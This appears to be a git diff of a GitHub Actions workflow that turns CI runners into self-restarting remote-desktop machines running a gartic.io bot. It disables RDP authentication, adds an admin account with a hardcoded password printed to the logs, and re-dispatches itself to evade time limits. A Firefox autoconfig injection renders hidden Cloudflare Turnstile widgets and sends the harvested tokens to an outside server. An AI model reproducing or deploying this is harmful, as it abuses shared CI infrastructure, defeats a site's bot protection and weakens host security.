@@ -1,19 +1,22 @@
-name: ˢᵃᶤᶠ ₉₁ 
+name: ˢᵃᶤᶠ ₉₁
 
 on:
   workflow_dispatch:
   schedule:
     - cron: '0 */6 * * *'
 
+permissions:
+  actions: write
+  contents: read
+
 jobs:
   gartic-bot:
     runs-on: windows-2019
     timeout-minutes: 360
     strategy:
-      # هذا الجزء هو "السر" لتشغيل نسختين في نفس الوقت
       matrix:
-        rdp_node: [1, 2] 
-    
+        rdp_node: [1, 2]
+
     steps:
       - name: 1. Configure RDP Network
         run: |
@@ -21,29 +24,20 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Configure Extensions (No Install Needed)
+      - name: 2. Inject Gartic Script (Base64 Method)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
-          $distDir = "$firefoxDir\distribution"
-          if (!(Test-Path $distDir)) { New-Item -ItemType Directory -Force -Path $distDir }
-          $extensions = @(
-              "https://addons.mozilla.org/firefox/downloads/latest/ublock-origin/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/auto-refresh-page/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/multi-account-containers/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/tampermonkey/latest.xpi"
-          )
-          $policies = @{
-              policies = @{
-                  Extensions = @{ Install = $extensions }
-                  DisableAppUpdate = $true
-                  DontCheckDefaultBrowser = $true
-                  Homepage = @{
-                      URL = "https://gartic.io"
-                      StartPage = "homepage"
-                  }
-              }
-          }
-          $policies | ConvertTo-Json -Depth 4 | Out-File "$distDir\policies.json" -Encoding UTF8
+          if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
+          
+          # إعدادات الفايرفوكس
+          $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
+          $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
+
+          # السكربت الخاص بك مشفر (Base64) لمنع أخطاء YAML
+          $base64Script = "try { window.addEventListener('load', function() { if (location.href.includes('gartic.io')) { setInterval(() => { location.reload(); }, 50000); function sendToken(t) { if (typeof t !== 'string' || t.length <= 20) return; fetch('https://www.xsw.work.gd/add-token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t }) }).catch(() => {}); } window.addEventListener('message', function(e) { if (e.data && typeof e.data === 'string') { sendToken(e.data); } }); for (let i = 0; i < 6; i++) { const f = document.createElement('iframe'); f.style.display = 'none'; f.sandbox = 'allow-scripts allow-same-origin'; document.body.appendChild(f); f.srcdoc = '<!DOCTYPE html><html><head><script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js\" async defer></script></head><body><div id=\"cf-turnstile\"></div><script>function r(){try{window.turnstile.render(\"#cf-turnstile\",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>'; } } }); } catch (e) {}"
+          
+          $cfgContent = "//`n" + $base64Script
+          $cfgContent | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
 
       - name: 3. Create RDP User
         run: |
@@ -51,20 +45,20 @@ jobs:
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
           New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "saif123"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "saif123"
 
-      - name: 4. Start Tailscale
+      - name: 4. Tailscale Setup
         run: |
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
           Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
-          # هنا استخدمنا رقم الـ node في الاسم عشان تفرق بينهم في تطبيق Tailscale
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="gartic-node-${{ matrix.rdp_node }}"
 
-      - name: 5. Launch Firefox & Info
+      - name: 5. Start & Auto-Restart Loop
+        env:
+          GH_TOKEN: ${{ github.token }}
         run: |
+          Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe" "https://gartic.io"
           $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          echo "::notice title=RDP CONNECT INFO (Node ${{ matrix.rdp_node }})::IP: $ip | User: saif123 | Pass: admin@123"
-          Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe"
-          Write-Host "RDP Node ${{ matrix.rdp_node }} is Ready!"
-          while ($true) { Start-Sleep -Seconds 300 }
+          echo "::notice title=RDP INFO::IP: $ip | User: saif123 | Pass: admin@123"
+          Start-Sleep -Seconds 20700
+          gh workflow run "ˢᵃᶤᶠ ₉₁"
